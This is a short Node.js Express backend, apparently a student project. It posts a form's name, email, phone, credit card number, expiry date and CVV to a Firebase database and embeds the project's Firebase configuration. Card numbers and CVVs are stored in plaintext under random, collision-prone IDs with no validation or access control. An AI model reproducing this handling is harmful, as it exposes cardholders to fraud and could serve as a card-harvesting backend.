// Welcome to Shep's Backend Project. Super Organzied. Everything Commented. Super Readable.

//!-----Imports-----!
import express from 'express';
const data = express();
import bodyParser from 'body-parser';
import { initializeApp } from 'firebase/app';
//import { getAnalytics } from 'firebase/analytics';
import { getDatabase, ref, set } from 'firebase/database';
//import { getDatabase, ref, set } from "https://sheps-tej4m-default-rtdb.firebaseio.com/";

//const path = require('path');

//Setting Up Express Server 

data.use(bodyParser.urlencoded({extended: true}));

  var server = data.listen(5550, () => {
  var host = server.address().address
  var port = server.address().port
  console.log("Example app listening at http://%s:%s", host, port);
})

//FIREBASE!

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAcmnXAW1HfIBaUMIij4AAgOn-zlFik58E",
  authDomain: "sheps-tej4m.firebaseapp.com",
  projectId: "sheps-tej4m",
  storageBucket: "sheps-tej4m.appspot.com",
  messagingSenderId: "978374437289",
  appId: "1:978374437289:web:1cc4ccee240dcc5fe3fcb8",
  measurementId: "G-XY154L261Q"
};

//FIREBASE INIT!!!
const app = initializeApp(firebaseConfig);
//const analytics = getAnalytics(app);
//Gets Database from Firebase
const database = getDatabase();


//When Submit is Clicked!
data.post('/submit-form', async (req, res) => {
  console.log('here');
  //res.sendFile(path.join(__dirname, 'home.html'));
  let email = req.body.email;
  let name = req.body.name;
  let cc = req.body.ccnum;
  let expdate = req.body.expdate;
  let cvv = req.body.cvv;
  let phone = req.body.phone;

  //Sends information to database!
  sendInformation(email, name, cc, expdate, cvv, phone);
});

function sendInformation(email, name, cc, expdate, cvv, phone) {
  //Math.random is for a random UID between 1 & 10000
  const userRef = ref(database, 'user/' + Math.floor(Math.random() * 10000));

  set(userRef, {
    Name: name,
    Email: email,
    CreditCard: cc,
    ExpireDate: expdate,
    CVV: cvv,
    PhoneNumber: phone
  });
}


